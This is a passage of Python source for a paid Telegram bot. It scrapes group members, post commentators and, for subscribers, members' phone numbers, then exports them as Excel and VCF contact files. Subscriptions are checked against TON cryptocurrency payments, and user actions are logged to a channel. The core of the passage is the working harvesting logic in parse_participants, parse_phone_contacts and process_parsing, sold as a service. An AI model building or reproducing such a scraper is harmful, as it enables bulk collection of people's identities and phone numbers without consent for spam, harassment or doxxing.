            data.append([
                participant.id,
                participant.username if participant.username else "",
                participant.first_name if participant.first_name else "",
                participant.last_name if participant.last_name else "",
                participant.bot,
                participant
            ])
    return data

async def parse_post_commentators(link, limit):
    parts = link.split('/')
    chat_id = parts[-2] if parts[-2].startswith('+') else f'@{parts[-2]}'
    message_id = int(parts[-1])
    entity = await client_telethon.get_entity(chat_id)
    message = await client_telethon.get_messages(entity, ids=message_id)
    if not message:
        return []
    
    commentators = set()
    replies = await client_telethon.get_messages(entity, limit=limit, reply_to=message.id)
    for reply in replies:
        if hasattr(reply, 'sender_id') and reply.sender_id:
            commentators.add(reply.sender_id)
    
    data = []
    for commentator_id in commentators:
        try:
            participant = await client_telethon.get_entity(commentator_id)
            if isinstance(participant, tl.types.User):
                data.append([
                    participant.id,
                    participant.username if participant.username else "",
                    participant.first_name if participant.first_name else "",
                    participant.last_name if participant.last_name else "",
                    participant.bot,
                    participant
                ])
        except (telethon_errors.RPCError, ValueError) as e:
            print(f"Ошибка получения сущности для ID {commentator_id}: {str(e)}")
            continue
    return data

async def parse_phone_contacts(group_link, limit):
    entity = await client_telethon.get_entity(group_link)
    participants = await client_telethon.get_participants(entity, limit=limit)
    data = []
    for participant in participants:
        if isinstance(participant, tl.types.User) and participant.phone:
            data.append([
                participant.id,
                participant.username if participant.username else "",
                participant.first_name if participant.first_name else "",
                participant.last_name if participant.last_name else "",
                participant.phone,
                participant
            ])
    return data

async def parse_auth_access(link, context):
    user_id = context.user_data.get('user_id')
    username = context.user_data.get('username', 'Без username')
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    try:
        parts = link.split('/')
        chat_id = parts[-2] if parts[-2].startswith('+') else f'@{parts[-2]}'
        entity = await client_telethon.get_entity(chat_id)
        if hasattr(entity, 'participants_count'):
            await context.bot.send_message(chat_id=user_id, text=texts['auth_success'])
            await log_to_channel(context, f"Доступ к закрытому чату {chat_id} успешно предоставлен для @{username}", username)
        else:
            await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
            await log_to_channel(context, f"Ошибка доступа к закрытому чату {chat_id} для @{username}", username)
    except telethon_errors.RPCError as e:
        await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
        await log_to_channel(context, f"Ошибка авторизации для @{username}: {str(e)}", username)

# Сообщение "Подождите..."
async def show_loading_message(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    await asyncio.sleep(2)
    if 'parsing_done' not in context.user_data:
        loading_message = await message.reply_text("Подождите..." if lang == 'Русский' else "Зачекай..." if lang == 'Украинский' else "Please wait..." if lang == 'English' else "Bitte warten...")
        context.user_data['loading_message_id'] = loading_message.message_id
        
        dots = 1
        while 'parsing_done' not in context.user_data:
            dots = (dots % 3) + 1
            new_text = ("Подождите" if lang == 'Русский' else "Зачекай" if lang == 'Украинский' else "Please wait" if lang == 'English' else "Bitte warten") + "." * dots
            try:
                await context.bot.edit_message_text(
                    chat_id=message.chat_id,
                    message_id=loading_message.message_id,
                    text=new_text
                )
            except telegram_error.BadRequest:
                break
            await asyncio.sleep(1)
        
        if 'parsing_done' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=message.chat_id,
                    message_id=loading_message.message_id
                )
            except telegram_error.BadRequest:
                pass

# Сообщение "Ожидается поступление средств..."
async def show_payment_pending(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    pending_message = await message.reply_text(texts['payment_pending'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['payment_update'], callback_data='update_payment')]]))
    context.user_data['pending_message_id'] = pending_message.message_id
    
    dots = 1
    while 'payment_done' not in context.user_data:
        dots = (dots % 3) + 1
        new_text = texts['payment_pending'] + "." * dots
        try:
            await context.bot.edit_message_text(
                chat_id=message.chat_id,
                message_id=pending_message.message_id,
                text=new_text
            )
        except telegram_error.BadRequest:
            break
        await asyncio.sleep(1)

# Обработка парсинга
async def process_parsing(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    username = message.from_user.username or "Без username"
    users = load_users()
    lang = users[str(user_id)]['language']
    texts = LANGUAGES[lang]
    subscription = users[str(user_id)]['subscription']
    
    context.user_data['parsing_in_progress'] = True
    asyncio.create_task(show_loading_message(message, context))
    
    try:
        await client_telethon.connect()
        all_data = []
        for link in context.user_data['links']:
            try:
                await client_telethon.get_entity(link.split('/')[-2] if context.user_data['parse_type'] in ['parse_post_commentators', 'parse_auth_access'] else link)
            except telethon_errors.ChannelPrivateError:
                context.user_data['parsing_done'] = True
                await message.reply_text(texts['no_access'].format(link=link))
                context.user_data['parsing_in_progress'] = False
                await log_to_channel(context, texts['no_access'].format(link=link), username)
                return
            except telethon_errors.RPCError as e:
                context.user_data['parsing_done'] = True
                await message.reply_text(texts['rpc_error'].format(e=str(e)))
                context.user_data['parsing_in_progress'] = False
                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
                print(f"Ошибка парсинга (RPC): {str(e)}\n{traceback.format_exc()}")
                return
            
            limit = check_parse_limit(user_id, context.user_data['limit'])
            if context.user_data['parse_type'] == 'parse_authors':
                data = await parse_commentators(link, limit)
            elif context.user_data['parse_type'] == 'parse_participants':
                data = await parse_participants(link, limit)
            elif context.user_data['parse_type'] == 'parse_post_commentators':
                data = await parse_post_commentators(link, limit)
            elif context.user_data['parse_type'] == 'parse_phone_contacts':
                data = await parse_phone_contacts(link, limit)
            elif context.user_data['parse_type'] == 'parse_auth_access':
                await parse_auth_access(link, context)
                context.user_data['parsing_done'] = True
                context.user_data['parsing_in_progress'] = False
                return
            
            all_data.extend(data)
        
        if context.user_data['parse_type'] == 'parse_phone_contacts':
            filtered_data = all_data
            excel_file = await create_excel_in_memory(filtered_data)
            vcf_file = create_vcf_file(pd.DataFrame(filtered_data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Phone', 'Nickname']))
            
            await message.reply_document(document=excel_file, filename="phones_contacts.xlsx", caption=texts['caption_phones'])
            await message.reply_document(document=vcf_file, filename="phones_contacts.vcf", caption=texts['caption_phones'])
            excel_file.close()
            vcf_file.close()
        else:
            filtered_data = filter_data(all_data, context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False}))
            count = len(filtered_data)
            entity = await client_telethon.get_entity(context.user_data['links'][0].split('/')[-2] if context.user_data['parse_type'] == 'parse_post_commentators' else context.user_data['links'][0])
            chat_title = entity.title
            
            excel_file = await create_excel_in_memory(filtered_data)
            stats = get_statistics(filtered_data)
            if context.user_data['parse_type'] == 'parse_authors':
                filename = f"{chat_title}_commentators.xlsx"
                caption = texts['caption_commentators']
                success_message = f'🎉 Найдено {count} комментаторов!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} коментаторів!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} commentators!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Kommentatoren gefunden!\n{stats}\nNochmal parsen? 🎉'
            elif context.user_data['parse_type'] == 'parse_participants':
                filename = f"{chat_title}_participants.xlsx"
                caption = texts['caption_participants']
                success_message = f'🎉 Найдено {count} участников!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} учасників!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} participants!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Teilnehmer gefunden!\n{stats}\nNochmal parsen? 🎉'
            elif context.user_data['parse_type'] == 'parse_post_commentators':
                filename = f"{chat_title}_post_commentators.xlsx"
                caption = texts['caption_post_commentators']
                success_message = f'🎉 Найдено {count} комментаторов поста!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} коментаторів поста!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} post commentators!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Beitragskommentatoren gefunden!\n{stats}\nNochmal parsen? 🎉'
            
            context.user_data['parsing_done'] = True
            await message.reply_document(document=excel_file, filename=filename, caption=caption)
            excel_file.close()
            
            update_user_data(user_id, message.from_user.full_name, context, requests=1)
            await log_to_channel(context, f"Успешно спарсил {count} записей из {chat_title}", username)
            
            msg = await message.reply_text(success_message, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Продолжить" if lang == 'Русский' else "Продовжити" if lang == 'Украинский' else "Continue" if lang == 'English' else "Fortfahren", callback_data='continue')]]))
            await context.bot.set_message_reaction(chat_id=message.chat_id, message_id=msg.message_id, reaction=["🎈"])
    
    except telethon_errors.FloodWaitError as e:
        context.user_data['parsing_done'] = True
        await message.reply_text(texts['flood_error'].format(e=str(e)))
        context.user_data['parsing_in_progress'] = False
        await log_to_channel(context, texts['flood_error'].format(e=str(e)), username)
        print(f"Ошибка FloodWait: {str(e)}\n{traceback.format_exc()}")
    except telethon_errors.RPCError as e:
        context.user_data['parsing_done'] = True
        await message.reply_text(texts['rpc_error'].format(e=str(e)))
        context.user_data['parsing_in_progress'] = False
        await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
        print(f"Ошибка RPC в парсинге: {str(e)}\n{traceback.format_exc()}")
    except Exception as e:
        context.user_data['parsing_done'] = True
        await message.reply_text("Произошла неизвестная ошибка при парсинге." if lang == 'Русский' else 
                                 "Сталася невідома помилка при парсингу." if lang == 'Украинский' else 
                                 "An unknown error occurred while parsing." if lang == 'English' else 
                                 "Ein unbekannter Fehler ist beim Parsen aufgetreten.")
        await log_to_channel(context, f"Неизвестная ошибка при парсинге для @{username}: {str(e)}", username)
        print(f"Неизвестная ошибка в парсинге: {str(e)}\n{traceback.format_exc()}")
    finally:
        context.user_data['parsing_in_progress'] = False
        await client_telethon.disconnect()

# Проверка статуса платежа
async def check_payment_status(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    username = message.from_user.username or "Без username"
    lang = load_users()[str(user_id)]['language']
    texts = LANGUAGES[lang]
    transaction_hash = context.user_data['transaction_hash']
    
    try:
        headers = {'Authorization': f'Bearer {TON_API_KEY}'}
        response = requests.get(f'https://toncenter.com/api/v2/getTransactions?address={TON_WALLET_ADDRESS}&limit=10', headers=headers)
        response.raise_for_status()
        transactions = response.json().get('result', [])
        
        for tx in transactions:
            if tx.get('hash') == transaction_hash:
                amount = float(tx.get('amount', 0)) / 10**9
                subscription = context.user_data['selected_subscription']
                expected_amount = {'1h': 2, '3d': 5, '7d': 7}[subscription]
                
                if amount >= expected_amount:
                    now = datetime.now()
                    if subscription == '1h':
                        end_time = now + timedelta(hours=1)
                    elif subscription == '3d':
                        end_time = now + timedelta(days=3)
                    else:
                        end_time = now + timedelta(days=7)
                    update_user_data(user_id, message.from_user.full_name, context, subscription={'type': f'Платная ({subscription})',
                    'end': end_time.isoformat()})
                    await message.reply_text(texts['payment_success'].format(end_time=end_time.strftime('%Y-%m-%d %H:%M:%S')))
                    await log_to_channel(context, f"Оплата успешно подтверждена для @{username}. Подписка: {subscription}, до {end_time}" if lang == 'Русский' else 
                                         f"Оплата успішно підтверджена для @{username}. Підписка: {subscription}, до {end_time}" if lang == 'Украинский' else 
                                         f"Payment successfully confirmed for @{username}. Subscription: {subscription}, until {end_time}" if lang == 'English' else 
                                         f"Zahlung erfolgreich bestätigt für @{username}. Abonnement: {subscription}, bis {end_time}", username)
                    context.user_data['payment_done'] = True
                    try:
                        await context.bot.delete_message(chat_id=message.chat_id, message_id=context.user_data['pending_message_id'])
                    except telegram_error.BadRequest:
                        pass
                    return
                else:
                    await message.reply_text(texts['payment_error'].format(error='Недостаточная сумма' if lang == 'Русский' else 
                                                                           'Недостатня сума' if lang == 'Украинский' else 
                                                                           'Insufficient amount' if lang == 'English' else 
                                                                           'Unzureichender Betrag'))
                    await log_to_channel(context, f"Ошибка оплаты для @{username}: Недостаточная сумма" if lang == 'Русский' else 
                                         f"Помилка оплати для @{username}: Недостатня сума" if lang == 'Украинский' else 
                                         f"Payment error for @{username}: Insufficient amount" if lang == 'English' else 
                                         f"Zahlungsfehler für @{username}: Unzureichender Betrag", username)
                    return
        
        await message.reply_text(texts['payment_error'].format(error='Транзакция не найдена' if lang == 'Русский' else 
                                                              'Транзакцію не знайдено' if lang == 'Украинский' else 
                                                              'Transaction not found' if lang == 'English' else 
                                                              'Transaktion nicht gefunden'))
        await log_to_channel(context, f"Ошибка оплаты для @{username}: Транзакция не найдена" if lang == 'Русский' else 
                             f"Помилка оплати для @{username}: Транзакцію не знайдено" if lang == 'Украинский' else 
                             f"Payment error for @{username}: Transaction not found" if lang == 'English' else 
                             f"Zahlungsfehler für @{username}: Transaktion nicht gefunden", username)
    
    except requests.RequestException as e:
        await message.reply_text(texts['payment_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка проверки платежа для @{username}: {str(e)}", username)
        print(f"Ошибка проверки платежа: {str(e)}\n{traceback.format_exc()}")

# Обработчик кнопок
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    context.user_data['user_id'] = user_id
    username = query.from_user.username or "Без username"
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    try:
        await query.answer()
    except telegram_error.BadRequest as e:
        if "Query is too old" in str(e) or "query id is invalid" in str(e):
            await log_to_channel(context, f"Ошибка: Устаревший или недействительный запрос от @{username} — {str(e)}", username)
            return
    
    try:
        await client_telethon.connect()
    except telethon_errors.RPCError as e:
        await query.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка подключения для @{username}: {str(e)}", username)
        print(f"Ошибка подключения в button: {str(e)}\n{traceback.format_exc()}")
        return

    if context.user_data.get('parsing_in_progress', False) and query.data not in ['close_id', 'continue_id']:
        await client_telethon.disconnect()
        return
    
    limit_ok, hours_left = check_request_limit(user_id)
    if not limit_ok:
        await query.message.reply_text(texts['limit_reached'].format(limit=5 if users[str(user_id)]['subscription']['type'] == 'Бесплатная' else 10, hours=hours_left))
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('lang_'):
        lang = query.data.split('_')[1]
        update_user_data(user_id, query.from_user.full_name, context, lang=lang)
        await query.message.edit_text(LANGUAGES[lang]['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(LANGUAGES[lang]['subscribed'], callback_data='subscribed')]]))
        await log_to_channel(context, f"Сменил язык на {lang} для @{username}" if lang == 'Русский' else 
                             f"Змінив мову на {lang} для @{username}" if lang == 'Украинский' else 
                             f"Changed language to {lang} for @{username}" if lang == 'English' else 
                             f"Sprache auf {lang} für @{username} geändert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'subscribed':
        menu_text, menu_markup = get_main_menu(user_id, context)
        await query.message.edit_text(menu_text, reply_markup=menu_markup)
        await log_to_channel(context, f"Пользователь @{username} начал работу" if lang == 'Русский' else 
                             f"Користувач @{username} почав роботу" if lang == 'Украинский' else 
                             f"User @{username} started working" if lang == 'English' else 
                             f"Benutzer @{username} hat begonnen zu arbeiten", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'identifiers':
        await query.message.reply_text(texts['you_chose'].format(button="Идентификаторы" if lang == 'Русский' else "Ідентифікатори" if lang == 'Украинский' else "Identifiers" if lang == 'English' else "Identifikatoren"))
        await query.message.reply_text(texts['identifiers'])
        context.user_data['waiting_for_id'] = True
        await log_to_channel(context, f"Пользователь @{username} запросил идентификаторы" if lang == 'Русский' else 
                             f"Користувач @{username} запросив ідентифікатори" if lang == 'Украинский' else 
                             f"User @{username} requested identifiers" if lang == 'English' else 
                             f"Benutzer @{username} hat Identifikatoren angefordert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'parser':
        await query.message.reply_text(texts['you_chose'].format(button="Сбор данных / Парсер" if lang == 'Русский' else "Збір даних / Парсер" if lang == 'Украинский' else "Data collection / Parser" if lang == 'English' else "Datensammlung / Parser"))
        subscription = users[str(user_id)]['subscription']
        is_paid = subscription['type'].startswith('Платная')
        keyboard = [
            [InlineKeyboardButton("Авторов" if lang == 'Русский' else "Авторів" if lang == 'Украинский' else "Authors" if lang == 'English' else "Autoren", callback_data='parse_authors')],
            [InlineKeyboardButton("Участников" if lang == 'Русский' else "Учасників" if lang == 'Украинский' else "Participants" if lang == 'English' else "Teilnehmer", callback_data='parse_participants')],
            [InlineKeyboardButton("Комментаторов поста" if lang == 'Русский' else "Коментаторів поста" if lang == 'Украинский' else "Post commentators" if lang == 'English' else "Beitragskommentatoren", callback_data='parse_post_commentators')]
        ]
        if is_paid:
            keyboard.extend([
                [InlineKeyboardButton(texts['phone_contacts'], callback_data='parse_phone_contacts')],
                [InlineKeyboardButton(texts['auth_access'], callback_data='parse_auth_access')]
            ])
        await query.message.reply_text(texts['parser'], reply_markup=InlineKeyboardMarkup(keyboard))
        await log_to_channel(context, f"Пользователь @{username} начал парсинг" if lang == 'Русский' else 
                             f"Користувач @{username} почав парсинг" if lang == 'Украинский' else 
                             f"User @{username} started parsing" if lang == 'English' else 
                             f"Benutzer @{username} hat mit dem Parsen begonnen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'subscribe':
        await query.message.reply_text(texts['you_chose'].format(button="Оформить подписку" if lang == 'Русский' else "Оформити підписку" if lang == 'Украинский' else "Subscribe" if lang == 'English' else "Abonnement abschließen"))
        keyboard = [
            [InlineKeyboardButton(texts['subscription_1h'], callback_data='subscribe_1h')],
            [InlineKeyboardButton(texts['subscription_3d'], callback_data='subscribe_3d')],
            [InlineKeyboardButton(texts['subscription_7d'], callback_data='subscribe_7d')]
        ]
        await query.message.reply_text("Выберите подписку:" if lang == 'Русский' else "Виберіть підписку:" if lang == 'Украинский' else "Choose a subscription:" if lang == 'English' else "Wähle ein Abonnement:", reply_markup=InlineKeyboardMarkup(keyboard))
        await log_to_channel(context, f"Пользователь @{username} выбрал подписку" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав підписку" if lang == 'Украинский' else 
                             f"User @{username} chose a subscription" if lang == 'English' else 
                             f"Benutzer @{username} hat ein Abonnement ausgewählt", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'requisites':
        await query.message.reply_text(texts['you_chose'].format(button="Реквизиты" if lang == 'Русский' else "Реквізити" if lang == 'Украинский' else "Requisites" if lang == 'English' else "Zahlungsdaten"))
        await query.message.reply_text(texts['requisites'].format(support=SUPPORT_USERNAME))
        await log_to_channel(context, f"Пользователь @{username} запросил реквизиты" if lang == 'Русский' else 
                             f"Користувач @{username} запросив реквізити" if lang == 'Украинский' else 
                             f"User @{username} requested requisites" if lang == 'English' else 
                             f"Benutzer @{username} hat Zahlungsdaten angefordert", username)
        await client_telethon.disconnect()
        return
    
    if query.data in ['parse_authors', 'parse_participants', 'parse_post_commentators', 'parse_phone_contacts', 'parse_auth_access']:
        context.user_data['parse_type'] = query.data
        await query.message.reply_text(texts['you_chose'].format(button={
            'parse_authors': 'Авторов' if lang == 'Русский' else 'Авторів' if lang == 'Украинский' else 'Authors' if lang == 'English' else 'Autoren',
            'parse_participants': 'Участников' if lang == 'Русский' else 'Учасників' if lang == 'Украинский' else 'Participants' if lang == 'English' else 'Teilnehmer',
            'parse_post_commentators': 'Комментаторов поста' if lang == 'Русский' else 'Коментаторів поста' if lang == 'Украинский' else 'Post commentators' if lang == 'English' else 'Beitragskommentatoren',
            'parse_phone_contacts': texts['phone_contacts'],
            'parse_auth_access': texts['auth_access']
        }[query.data]))
        if query.data in ['parse_post_commentators', 'parse_auth_access']:
            await query.message.reply_text(texts['link_post'])
        else:
            await query.message.reply_text(texts['link_group'])
        await log_to_channel(context, f"Пользователь @{username} выбрал парсинг {query.data}" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав парсинг {query.data}" if lang == 'Украинский' else 
                             f"User @{username} chose parsing {query.data}" if lang == 'English' else 
                             f"Benutzer @{username} hat das Parsen von {query.data} ausgewählt", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'continue':
        menu_text, menu_markup = get_main_menu(user_id, context)
        await query.message.reply_text(menu_text, reply_markup=menu_markup)
        context.user_data.clear()
        context.user_data['user_id'] = user_id
        await log_to_channel(context, f"Пользователь @{username} продолжил работу" if lang == 'Русский' else 
                             f"Користувач @{username} продовжив роботу" if lang == 'Украинский' else 
                             f"User @{username} continued working" if lang == 'English' else 
                             f"Benutzer @{username} hat die Arbeit fortgesetzt", username)
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('limit_'):
        if query.data == 'limit_custom':
            context.user_data['waiting_for_limit'] = True
            await query.message.reply_text(texts['you_chose'].format(button="Другое" if lang == 'Русский' else "Інше" if lang == 'Украинский' else "Other" if lang == 'English' else "Andere"))
            await query.message.reply_text("Укажи своё число (максимум 15000):" if lang == 'Русский' else 
                                          "Вкажи своє число (максимум 15000):" if lang == 'Украинский' else 
                                          "Enter your number (maximum 15,000):" if lang == 'English' else 
                                          "Gib deine Zahl ein (maximal 15.000):", 
                                          reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
        else:
            context.user_data['limit'] = int(query.data.split('_')[1])
            await query.message.reply_text(texts['you_chose'].format(button=query.data.split('_')[1]))
            await ask_for_filters(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} установил лимит {context.user_data.get('limit', 'по умолчанию')}" if lang == 'Русский' else 
                             f"Користувач @{username} встановив ліміт {context.user_data.get('limit', 'за замовчуванням')}" if lang == 'Украинский' else 
                             f"User @{username} set limit to {context.user_data.get('limit', 'default')}" if lang == 'English' else 
                             f"Benutzer @{username} hat das Limit auf {context.user_data.get('limit', 'Standard')} gesetzt", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'skip_limit':
        context.user_data['limit'] = 1000
        context.user_data.pop('waiting_for_limit', None)
        await query.message.reply_text(texts['you_chose'].format(button="Пропустить" if lang == 'Русский' else "Пропустити" if lang == 'Украинский' else "Skip" if lang == 'English' else "Überspringen"))
        await ask_for_filters(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} пропустил лимит" if lang == 'Русский' else 
                             f"Користувач @{username} пропустив ліміт" if lang == 'Украинский' else 
                             f"User @{username} skipped the limit" if lang == 'English' else 
                             f"Benutzer @{username} hat das Limit übersprungen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'no_filter':
        context.user_data['limit'] = 15000 if users[str(user_id)]['subscription']['type'].startswith('Платная') else 150
        context.user_data['filters'] = {'only_with_username': False, 'exclude_bots': False, 'only_active': False}
        await query.message.reply_text(texts['you_chose'].format(button=texts['no_filter']))
        await process_parsing(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} выбрал парсинг без фильтров с лимитом {context.user_data['limit']}" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав парсинг без фільтрів з лімітом {context.user_data['limit']}" if lang == 'Украинский' else 
                             f"User @{username} chose parsing without filters with limit {context.user_data['limit']}" if lang == 'English' else 
                             f"Benutzer @{username} hat Parsen ohne Filter mit Limit {context.user_data['limit']} ausgewählt", username)
        await client_telethon.disconnect()
        return
    
    if query.data in ['filter_yes', 'filter_no', 'skip_filters']:
        filters = context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False})
        current_filter = context.user_data['current_filter']
        if query.data == 'filter_yes':
            filters[current_filter] = True
            await query.message.reply_text(texts['you_chose'].format(button="Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja"))
        elif query.data == 'filter_no':
            await query.message.reply_text(texts['you_chose'].format(button="Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein"))
        else:
            await query.message.reply_text(texts['you_chose'].format(button="Пропустить" if lang == 'Русский' else "Пропустити" if lang == 'Украинский' else "Skip" if lang == 'English' else "Überspringen"))
        
        if current_filter == 'only_with_username' and query.data != 'skip_filters':
            context.user_data['current_filter'] = 'exclude_bots'
            await query.message.reply_text(texts['filter_bots'], reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
                 InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
                [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
            ]))
        elif current_filter == 'exclude_bots' and query.data != 'skip_filters':
            context.user_data['current_filter'] = 'only_active'
            await query.message.reply_text(texts['filter_active'], reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
                 InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
                [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
            ]))
        else:
            del context.user_data['waiting_for_filters']
            del context.user_data['current_filter']
            context.user_data['filters'] = filters
            await process_parsing(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} установил фильтры: {filters}" if lang == 'Русский' else 
                             f"Користувач @{username} встановив фільтри: {filters}" if lang == 'Украинский' else 
                             f"User @{username} set filters: {filters}" if lang == 'English' else 
                             f"Benutzer @{username} hat Filter gesetzt: {filters}", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'fix_link':
        last_input = context.user_data.get('last_input', '')
        if not last_input:
            await query.message.reply_text(texts['retry_link'])
            await client_telethon.disconnect()
            return
        suggested_link = f"https://t.me/{last_input}" if not last_input.startswith('https://t.me/') else last_input
        keyboard = [
            [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data=f"confirm_link_{suggested_link}"),
             InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='retry_link')]
        ]
        await query.message.reply_text(texts['suggest_link'].format(link=suggested_link), reply_markup=InlineKeyboardMarkup(keyboard))
        await log_to_channel(context, f"Пользователь @{username} исправляет ссылку" if lang == 'Русский' else 
                             f"Користувач @{username} виправляє посилання" if lang == 'Украинский' else 
                             f"User @{username} is fixing the link" if lang == 'English' else 
                             f"Benutzer @{username} korrigiert den Link", username)
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('confirm_link_'):
        link = query.data.split('confirm_link_')[1]
        context.user_data['links'] = [link]
        await ask_for_limit(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} подтвердил ссылку: {link}" if lang == 'Русский' else 
                             f"Користувач @{username} підтвердив посилання: {link}" if lang == 'Украинский' else 
                             f"User @{username} confirmed the link: {link}" if lang == 'English' else 
                             f"Benutzer @{username} hat den Link bestätigt: {link}", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'retry_link':
        await query.message.reply_text(texts['retry_link'])
        await log_to_channel(context, f"Пользователь @{username} запросил повторный ввод ссылки" if lang == 'Русский' else 
                             f"Користувач @{username} запросив повторне введення посилання" if lang == 'Украинский' else 
                             f"User @{username} requested to re-enter the link" if lang == 'English' else 
                             f"Benutzer @{username} hat eine erneute Eingabe des Links angefordert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'close_id':
        await context.bot.delete_message(chat_id=query.message.chat_id, message_id=query.message.message_id)
        await log_to_channel(context, f"Пользователь @{username} закрыл сообщение с ID" if lang == 'Русский' else 
                             f"Користувач @{username} закрив повідомлення з ID" if lang == 'Украинский' else 
                             f"User @{username} closed the message with ID" if lang == 'English' else 
                             f"Benutzer @{username} hat die Nachricht mit ID geschlossen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'continue_id':
        await query.message.reply_text(texts['identifiers'])
        context.user_data['waiting_for_id'] = True
        await log_to_channel(context, f"Пользователь @{username} продолжил запрос ID" if lang == 'Русский' else 
                             f"Користувач @{username} продовжив запит ID" if lang == 'Украинский' else 
                             f"User @{username} continued requesting ID" if lang == 'English' else 
                             f"Benutzer @{username} hat die Anfrage nach ID fortgesetzt", username)
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('info_'):
        info_texts = {
            'info_identifiers': texts['identifiers'],
            'info_parser': "Доступен парсинг авторов, участников и комментаторов постов с фильтрами и лимитами (макс. 15000 для платных, 150 для бесплатных)." if lang == 'Русский' else
                          "Доступний парсинг авторів, учасників та коментаторів постів з фільтрами та лімітами (макс. 15000 для платних, 150 для безкоштовних)." if lang == 'Украинский' else
                          "Available parsing of authors, participants, and post commentators with filters and limits (max 15,000 for paid, 150 for free)." if lang == 'English' else
                          "Verfügbares Parsen von Autoren, Teilnehmern und Beitragskommentatoren mit Filtern und Limits (max. 15.000 für bezahlt, 150 für kostenlos).",
            'info_subscribe': "Подписка даёт доступ к дополнительным функциям (макс. 15000 пользователей). Свяжитесь с поддержкой для оплаты." if lang == 'Русский' else
                             "Підписка дає доступ до додаткових функцій (макс. 15000 користувачів). Зв’яжіться з підтримкою для оплати." if lang == 'Украинский' else
                             "Subscription gives access to additional features (max 15,000 users). Contact support for payment." if lang == 'English' else
                             "Das Abonnement gibt Zugang zu zusätzlichen Funktionen (max. 15.000 Benutzer). Kontaktiere den Support für die Zahlung.",
            'info_requisites': texts['requisites'].format(support=SUPPORT_USERNAME),
            'info_logs': texts['logs_channel']
        }
        await query.answer(text=info_texts[query.data], show_alert=True)
